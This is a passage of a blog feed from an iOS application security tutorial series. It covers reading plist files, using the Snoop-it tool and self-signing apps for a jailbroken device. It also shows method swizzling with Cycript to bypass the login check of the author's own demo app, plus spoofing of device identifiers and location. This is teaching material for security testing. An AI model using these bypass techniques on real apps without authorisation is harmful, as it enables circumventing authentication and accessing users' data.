&lt;p&gt;If you want to read the plist file from the terminal itself, you will first have to convert it into xml format using the tool &lt;em&gt;plutil&lt;/em&gt;. The command is &lt;em&gt;plutil -covert xml1 [filename]&lt;/em&gt;. First, lets search for all the plist files in the device by using the 2 commands as shown in the figure below.&lt;/p&gt;

&lt;p&gt;. &lt;img src=&quot;/images/posts/ios10/34.png&quot; alt=&quot;34&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, let’s covert any one file to xml format.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios10/35.png&quot; alt=&quot;35&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The file is now organized in a structure format. Let’s open the file using vim.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios10/36.png&quot; alt=&quot;36&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see, we are now able to analyze the contents of the plist file.&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;In this article, we looked at the iOS filesystem, learnt how the directory structure is organized, looked at some important files and learnt how to extract information from database and plist files. In the next article, we will take a sample application and use all the techniques learnt in the previous articles to perfom a detailed security analysis of the app.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>iOS Application Security Part 9 – Analyzing Security of iOS Applications using Snoop-it</title>
   <link href="https://bitbrain.github.io/2013/08/20/ios-application-security-part-9-analyzing-security-of-ios-applications-using-snoop-it.html"/>
   <updated>2013-08-20T07:29:00+00:00</updated>
   <id>https://bitbrain.github.io/2013/08/20/ios-application-security-part-9-analyzing-security-of-ios-applications-using-snoop-it</id>
   <content type="html">&lt;p&gt;In some of the previous articles, we have looked at how we can dump class information of iOS apps using class-dump-z, hook into the runtime using Cycript and perform runtime manipulation and method swizzling, analyze the flow of the app using gdb etc. However, there could be a much better way of doing these things. We shouldn’t be using seperate tools for all these tasks. It would be great if a tool could perform all these tasks and at the same time display the information in a much more presentable way.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;Snoop-it is a tool that solves these problems. It allows for runtime analysis and blackbox security assessment of iOS apps by retrofitting existing apps with debugging and runtime tracing capabilities. It also provides a very neat web interface. At the time of writing of this article, Snoop-it is not released yet but is a couple of weeks away from launch. I mailed the authors and they were nice enough to provide me with a beta version for testing. You can check out its official page &lt;a href=&quot;https://code.google.com/p/snoop-it/&quot;&gt;here&lt;/a&gt; or you can follow the author on &lt;a href=&quot;http://twitter.com/aykay/&quot;&gt;Twitter&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;.&lt;/p&gt;

&lt;p&gt;A quick list of all the features provided by Snoop-it could be seen in the screenshot below taken from its official &lt;a href=&quot;https://code.google.com/p/snoop-it/&quot;&gt;page&lt;/a&gt;. &lt;img src=&quot;/images/posts/ios9/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;installation&quot;&gt;Installation&lt;/h2&gt;

&lt;p&gt;To install Snoop-it on your device, you will have to download the deb package file and then upload it on your device using sftp. Once this is done, use the command &lt;em&gt;dpkg -i [packageName]&lt;/em&gt; to install Snoop-it on your device. Once this is done, respring or reboot your device.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios9/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once this is done, you will see the Snoop-it app icon on your device. Open it up and you will see this user interface.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios9/IMG_0109.PNG&quot; alt=&quot;IMG 0109&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Go to Settings and configure the app according to your need. In this case, i have chosen the port number to be 12345 and i have also disabled the authentication. It might be a good idea however to have the authentication enabled if you are testing on a network with lots of users, or a network with a few naughty users.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios9/IMG_0110.PNG&quot; alt=&quot;IMG 0110&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, just open the Snoop-it web interface by browsing to the address provided on the Snoop-it application. In my case, the address is http://10.0.1.79:12345&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios9/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You will see this web interface. If you read it up, its asking you to &lt;em&gt;select an application that needs to be analyzed from the Snoop-it application, open it up on the device, and then refresh this web interface&lt;/em&gt;. So let’s go back to the Snoop-it application and select the applications that we need to analyze. In my case, i am going to select the &lt;em&gt;MethodSwizzlingDemo&lt;/em&gt; app, the same app that we used in the &lt;a href=&quot;http://resources.infosecinstitute.com/ios-application-security-part-8-method-swizzling-using-cycript/&quot;&gt;previous&lt;/a&gt; article.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios9/IMG_0111.PNG&quot; alt=&quot;IMG 0111&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, make sure that the app is opened on your device and in foreground and now refresh the Snoop-it web interface.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios9/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And now as you can see, you have a beautiful interface now that you can use to perform a full fledged security assessment of the application.&lt;/p&gt;

&lt;h2 id=&quot;analysis&quot;&gt;Analysis&lt;/h2&gt;

&lt;p&gt;On the left hand side, under &lt;em&gt;Analysis&lt;/em&gt;, go to &lt;em&gt;Objective-C classes&lt;/em&gt;. On the right hand side, you will see all the classes and info like properties and method names.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios9/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The ones in orange represent the classes that have instances. For e.g if you hover your mouse over the class &lt;em&gt;View Controller&lt;/em&gt;, you will see that it has an instance which is live presently.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios9/6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Similarly, you can see the methods and properties for AppDelegate.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios9/7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Coming back to view controller, it is possible for us to invoke a method using Snoop-it. Just check any particular method, and click on &lt;em&gt;Setup and Invoke&lt;/em&gt; on the top right. As we saw in the &lt;a href=&quot;http://resources.infosecinstitute.com/ios-application-security-part-8-method-swizzling-using-cycript/&quot;&gt;previous&lt;/a&gt; article, with this technique we were able to bypass the authentication check for this application.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios9/8.png&quot; alt=&quot;8&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Select the instace (there is only one now, but there could be multiple instances if the view controller is being reused across the application), and click on &lt;em&gt;Invoke Method&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios9/x.png&quot; alt=&quot;X&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This will invoke the method and will bypass the authentication.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios9/IMG_0112.PNG&quot; alt=&quot;IMG 0112&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Another awesome feature of Snoop-it is that we can switch to any View controller. For e.g, on the extreme left hand side, under &lt;em&gt;Analysis&lt;/em&gt;, select &lt;em&gt;View Controller&lt;/em&gt;, select the &lt;em&gt;View Controller&lt;/em&gt; class on the right hand side and click on &lt;em&gt;Display Controller&lt;/em&gt;. You will be switched to that view controller. You can also click on &lt;em&gt;Close/Hide View Controller&lt;/em&gt; depending on whether the view controller is over another view controller or not.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios9/9.png&quot; alt=&quot;9&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You can then tap on &lt;em&gt;Reset display&lt;/em&gt; to come back. As you can understand, this feature will really help us relate the view controller to its view in the app. So if i have a view controller in the Classes section, i can use this feature to see its visual representation. I just love this feature of Snoop-it.&lt;/p&gt;

&lt;h2 id=&quot;runtime-manipulation&quot;&gt;Runtime Manipulation&lt;/h2&gt;

&lt;p&gt;Snoop-it also allows for many ways of runtime manipulation, including changing your hardware identifier attributes like Mac address, UDID, device model number etc.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios9/10.png&quot; alt=&quot;10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You can also spoof your location. This could be particular useful for apps that use GeoEncryption techniques to protect their data.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios9/11.png&quot; alt=&quot;11&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And, you can trace methods and system calls on the flow. Please note that you will have to click on &lt;em&gt;Refresh&lt;/em&gt; on the top to see the method calls being made after every few seconds. Also, FYI since we are testing on a beta release it is possible that the authors may change it so that we don’t have to click on &lt;em&gt;Refresh&lt;/em&gt; after every few seconds. This information might be a bit too much for some users, but if you have been developing iOS applications for a couple of years like me, then this information should be pretty much straightforward.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios9/12.png&quot; alt=&quot;12&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;monitoring&quot;&gt;Monitoring&lt;/h2&gt;

&lt;p&gt;Snoop-it also allows you to look at the various files and directories that are being accessed by the application. To do that, on the navigation menu on the left side, click on &lt;em&gt;Filesystem&lt;/em&gt; under &lt;em&gt;Monitoring&lt;/em&gt;.This feature can be particular useful when a particular application is writing to a database file and this interface helps you in figuring out that filename. You can also download these files just by double clicking on them and then analyze it on your machine.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios9/13.png&quot; alt=&quot;13&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You can also see all the access made by the application using sensitive API. This could include looking for info on the Address book, accessing the camera, or just finding the UDID for the device. Here is the sensitive API accessed by the &lt;em&gt;App Store&lt;/em&gt; application which comes preinstalled on all iOS devices.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios9/y.png&quot; alt=&quot;Y&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can also see all the information stored in the keychain by this application. Also, it is possible to see a list of all HTTP requests sent using NSURLConnection. Both of these features can be accessed under the navigation menu under &lt;em&gt;Monitoring&lt;/em&gt;. I leave it up to you to try these features out. Also, we will be discussing how to dump information from keychain in a seperate article.&lt;/p&gt;

&lt;p&gt;You will be happy to know that Snoop-it has a public API that we can make use of in order to automate tests or just to build our own graphical user interface. A documentation of the XML-RPC web service API can be found &lt;a href=&quot;http://code.google.com/p/snoop-it/wiki/&quot;&gt;here&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;In this article, we looked at how we can we can use Snoop-it to perform runtime analysis and black box security assessment of iOS Applications and how easy it makes our task. Snoop-it is still a few weeks away from release at the time of writing this article, though you can always mail the author for a beta version like i did. One of the new features that i would like added in Snoop-it is the ability to perform Method Swizzling.I am pretty sure it will be an awesome tool for anyone interested in performing security analysis of iOS Applications and it’s only going to get better :)&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>iOS Application Security Part 8 -  Method Swizzling using Cycript</title>
   <link href="https://bitbrain.github.io/2013/07/25/ios-application-security-part-8-method-swizzling-using-cycript.html"/>
   <updated>2013-07-25T15:16:00+00:00</updated>
   <id>https://bitbrain.github.io/2013/07/25/ios-application-security-part-8-method-swizzling-using-cycript</id>
   <content type="html">&lt;p&gt;In the previous article, we looked at how we can install custom apps on our device without a developer certificate. In this article, we will look at how we can perform method Swizzling using Cycript on a sample application.&lt;/p&gt;

&lt;p&gt;The first thing is to download the sample Xcode project. You can download the Xcode project from &lt;a href=&quot;https://dl.dropboxusercontent.com/u/34557464/MethodSwizzlingDemo.zip&quot;&gt;here&lt;/a&gt;. Or you can also just download the binary file on your device from &lt;a href=&quot;https://dl.dropboxusercontent.com/u/34557464/MethodSwizzlingDemo.ipa&quot;&gt;here&lt;/a&gt;. If you have installed the Xcode project, you will have to build the Xcode project using a self signed certificate.The previous article talks about this in great detail. If you have downloaded the binary, you can directly run it on a jailbroken device without any issues but to get a look at the source code, it is recommended to download the Xcode project.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;Also please make sure to sign the Xcode project with your own certificate.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios8/Self-signedcert.png&quot; alt=&quot;Self Signedcert&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once you have the app running on your device, ssh into your device and hook into the running process using Cycript.&lt;/p&gt;

&lt;p&gt;You can hook into any running process with this command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cycript -p [APP_ID]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios8/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see on the device, this application has a login form. Please note that for this article, we will only be bypassing login on tap of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Login Method 1&lt;/code&gt; button.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios8/IMG_0102.PNG&quot; alt=&quot;IMG 0102&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The username and password are &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin:password&lt;/code&gt;. It will take us to the admin page.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios8/IMG_0103.PNG&quot; alt=&quot;IMG 0103&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If we enter an incorrect username/password combination, we will be prompted with an alert.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios8/IMG_0104.PNG&quot; alt=&quot;IMG 0104&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Our goal hence is to bypass this login view.&lt;/p&gt;

&lt;p&gt;So first, lets find the root view controller of this application. Use this command in cycript &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UIApp.keyWindow.rootViewController&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios8/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ok, since the login page is the first view that we get to see in the application, we can be sure that the view controller class responsible for displaying this view is a part of the navigation controller that we found with the previous command. We can find the current view by finding the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;visibleViewController&lt;/code&gt; property of the navigation controller&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios8/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Perfect. Now let’s write a function to print out all the methods for this view controller. This method is taken from the Cycript tricks &lt;a href=&quot;http://iphonedevwiki.net/index.php/Cycript_Tricks&quot;&gt;page&lt;/a&gt;. I recommend you to have a look at this page for many useful code snippets.&lt;/p&gt;

&lt;p&gt;Here is the function i am using.&lt;/p&gt;

&lt;pre&gt;	function printMethods(className) {
	  var count = new new Type(&quot;I&quot;);
	  var methods = class_copyMethodList(objc_getClass(className), count);
	  var methodsArray = [];
	  for(var i = 0; i &amp;lt; *count; i++) {
	    var method = methods[i];
	    methodsArray.push({selector:method_getName(method), implementation:method_getImplementation(method)});
	  }
	  free(methods);
	  free(count);
	  return methodsArray;
	}
&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios8/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now lets print out the methods for the current view controller. Please note that the parameter this method takes is the className, which in this case is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ViewController&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios8/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Another way to know about the method names is by using the isa.messages property. According to Apple’s &lt;a href=&quot;http://developer.apple.com/library/ios/#DOCUMENTATION/Cocoa/Conceptual/ObjCRuntimeGuide/Articles/ocrtHowMessagingWorks.html#//apple_ref/doc/uid/TP40008048-CH104-SW1&quot;&gt;documentation&lt;/a&gt; isa is basically a pointer to the class structure.&lt;/p&gt;

&lt;p&gt;Here is a line taken from the same page.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;When a new object is created, memory for it is allocated, and its instance variables are initialized. First among the object’s variables is a pointer to its class structure. This pointer, called isa, gives the object access to its class and, through the class, to all the classes it inherits from.&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;This image from Apple’s &lt;a href=&quot;http://developer.apple.com/library/ios/#DOCUMENTATION/Cocoa/Conceptual/ObjCRuntimeGuide/Articles/ocrtHowMessagingWorks.html#//apple_ref/doc/uid/TP40008048-CH104-SW1&quot;&gt;documentation&lt;/a&gt; will make things more clear.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios8/6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So what is the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;messages&lt;/code&gt; property ? Well, first we must know what is a dispatch table. A dispatch table is a table containing entries that associate method selectors with the class-specific addresses of the methods they identify. Let’s have a look at this image taken from Apple’s &lt;a href=&quot;http://developer.apple.com/library/ios/#DOCUMENTATION/Cocoa/Conceptual/ObjCRuntimeGuide/Articles/ocrtHowMessagingWorks.html#//apple_ref/doc/uid/TP40008048-CH104-SW1&quot;&gt;documentation&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios8/7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So now, it is easy to guess that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;messages&lt;/code&gt; property is the complete list of messages that could be sent to an instance of the class or the class itself. This will be a huge list because the isa pointer will pick messages from all the superclasses also, leading up to NSObject. A very important line to be noted in the image above is this. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;This is the way that method implementations are chosen at runtime—or, in the jargon of object-oriented programming, that methods are dynamically bound to messages.&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Since the methods are dynamically bound to messages at runtime, it is possible for us to change a method implementation for a particular message.&lt;/p&gt;

&lt;p&gt;In this case, let’s print out the messages for the App Delegate class.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios8/8.png&quot; alt=&quot;8&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Just using the messages property will also work.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios8/9.png&quot; alt=&quot;9&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In this case, the view controller that we are concerned with is the one used to display the login page, which we found out earlier to be named as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ViewController&lt;/code&gt;. So let’s display all the messages for this VC.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios8/10.png&quot; alt=&quot;10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;On the top of the output, you could see some of the methods for this VC.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios8/11.png&quot; alt=&quot;11&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The method &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;validateLogin&lt;/code&gt; looks interesting. Let’s have a look at this method from the class-dump-z output. In case you are not familiar with class-dump-z, please have a look at the &lt;a href=&quot;http://resources.infosecinstitute.com/ios-application-security-part-2-getting-class-information-of-ios-apps/&quot;&gt;2nd part&lt;/a&gt; of this series.&lt;/p&gt;

&lt;p&gt;Here is the information that we get for the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ViewController&lt;/code&gt; class from its class-dump-z output.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios8/12.png&quot; alt=&quot;12&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see,the method validateLogin returns a BOOL value. Well, it can be assumed that this method checks whether the username and password are correct and returns a YES or NO accordingly. With Cycript, we can change the implementation for a particular message. So let’s change the implementation to something that always returns TRUE.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios8/13.png&quot; alt=&quot;13&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So the R.H.S contains a javascript function that always returns true. Let’s now tap on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Login Method 1&lt;/code&gt; in the app.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios8/IMG_0103.PNG&quot; alt=&quot;IMG 0103&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see, the authentication was successful and the app let us through. We have just performed method swizzling using Cycript to bypass a login form.&lt;/p&gt;

&lt;h2 id=&quot;some-other-cool-things&quot;&gt;Some other cool things&lt;/h2&gt;

&lt;p&gt;Now that we have seen how method swizzling works, it would be interesting to know some other way to bypass this authentication. From the class-dump-z output, we can figure out that once validateLogin returns TRUE, the method &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pushLoginPage&lt;/code&gt; gets called. Some other names for such methods could have been &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pushUserPage&lt;/code&gt;, or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pushLoginSuccessfulPage&lt;/code&gt; etc. Well, we don’t need the validation to be true. We can always call this method ourselves.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios8/14.png&quot; alt=&quot;14&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Since this is an instance method, we got to the instance using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UIApp.keyWindow.rootViewController.visibleViewController&lt;/code&gt; and then called the method .Please note that this may lead to crashes or inconsistent data as the properties of the pushed View Controller may depend on the login information entered.If you are up for another challenge, try bypassing the login form after tapping on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Login Method 2&lt;/code&gt;. We will discuss how to bypass this in later articles.&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;In this article we looked at some Method Swizzling techniques using Cycript. In later articles we will discuss more automation techniques and better tools that we can use to achieve this goal. We will also look at how we can use gdb for performing runtime analysis and otool for gathering other kinds of information.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>iOS Application Security Part 7 - Installing and Running Custom Applications on Device without a registered developer account</title>
   <link href="https://bitbrain.github.io/2013/07/25/ios-application-security-part-7-installing-and-running-custom-applications-on-device-without-a-registered-developer-account.html"/>
   <updated>2013-07-25T15:15:00+00:00</updated>
   <id>https://bitbrain.github.io/2013/07/25/ios-application-security-part-7-installing-and-running-custom-applications-on-device-without-a-registered-developer-account</id>
   <content type="html">&lt;p&gt;Usually, to test apps on a device, you need to be a registered developer which costs about $99/year. For people who want to learn iOS Application security, it is very important that they should be able to run applications on device so that they can perfom tests on them. For some people who do not want to publish any apps on the app store, it may not be worth it to pay the $99/year fees. In this article we will be looking at how we can build and install an application on a jailbroken idevice without having a registered developer account. Then in the next article we will look at how we can run our own applications on the device and use Cycript to perform method swizzling and other techniques.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;This article will focus on running custom apps on device using Xcode 4.5.2 on iOS 5.1 . This same technique might or might not work on other versions of iOS or Xcode. If you face some problems running the application on device, please drop a comment and i will respond to that asap.&lt;/p&gt;

&lt;p&gt;The first step is to create a self signed certificate. We will use this certificate to sign thw apps that we want to run on the device.&lt;/p&gt;

&lt;p&gt;Open the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Keychain Access&lt;/code&gt; application. Tap on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Keychain Access --&amp;gt; Certificate Assistant --&amp;gt; Create a Certificate&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios7/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Name the certificate, in this case &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Prateekg&lt;/code&gt;, select the certificate type as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Code Signing&lt;/code&gt; and do not check the option &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Let me Override defaults&lt;/code&gt;. Click on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Create&lt;/code&gt; and tap on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Continue&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios7/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see, our certificate has been created.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios7/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now copy the Info.plist file from the location /Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Info.plist to your Desktop. We are doing this because we want to edit this file but we cannot do it on its original location. So in order to do this, we first have to copy this file to Desktop, edit it and then put it back.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios7/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Open it up.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios7/xyx.png&quot; alt=&quot;Xyx&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now in this file, replace all occurences of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;XCiPhoneOSCodeSignContext&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;XCCodeSignContext&lt;/code&gt; and save it. Here it how your file should look like.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios7/5.png&quot; alt=&quot;5&quot; /&gt; &lt;img src=&quot;/images/posts/ios7/6.png&quot; alt=&quot;6&quot; /&gt; &lt;img src=&quot;/images/posts/ios7/7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now copy this file back from where you fetched it. You will need to have appropriate permissions for this. The command in my case is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo cp /Users/prateekgianchandani/Desktop/Info.plist /Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Info.plist&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios7/8.png&quot; alt=&quot;8&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now its time to create a sample Xcode project. Open up Xcode, click on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Create a new Xcode Project&lt;/code&gt;, Select &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Single View Application&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios7/9.png&quot; alt=&quot;9&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Name the projet anything, in this case &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SelfSignedApp&lt;/code&gt;, click on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Next&lt;/code&gt;, then click on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Create&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios7/10.png&quot; alt=&quot;10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Since we will be running this app on a device running iOS 5.1, we need to make sure the deployment target matches that. Tap on the project name in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Project Navigator&lt;/code&gt; on the top left, select the project and then inside &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Info&lt;/code&gt;, set the Deployment target to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;5.1&lt;/code&gt; as shown in the figure below. You can choose your deployment target depending on the operating system you are running your device on.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios7/11.png&quot; alt=&quot;11&quot; /&gt;&lt;/p&gt;

&lt;p&gt;For cases where we are running the app on iOS 5.1, since we have a storyboard in this app, and because iOS 5.1 does not support the Autolayout feature in Storyboards, the app will crash. Hence make sure that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Use Autolayout&lt;/code&gt; option is not selected on the storyboard.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios7/12.png&quot; alt=&quot;12&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now just drag and drop a label into the storyboard and write some text on it.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios7/13.png&quot; alt=&quot;13&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now we have to tell Xcode to sign this app using our self generated certificate. To do that, tap on the project name in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Project Navigator&lt;/code&gt; on the top left, select the project and then inside &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Build Settings&lt;/code&gt;, select the certificate that we created a while back. If the certificate doesn’t show up in the dropdown for some reason, try restarting code.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios7/14.png&quot; alt=&quot;14&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now select the device that you want to run the app on. If for some reason, the device doesn’t show up on the list, go to Organizer –&amp;gt; Devices –&amp;gt; Your device and click on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Use for development&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios7/15.png&quot; alt=&quot;15&quot; /&gt;&lt;/p&gt;

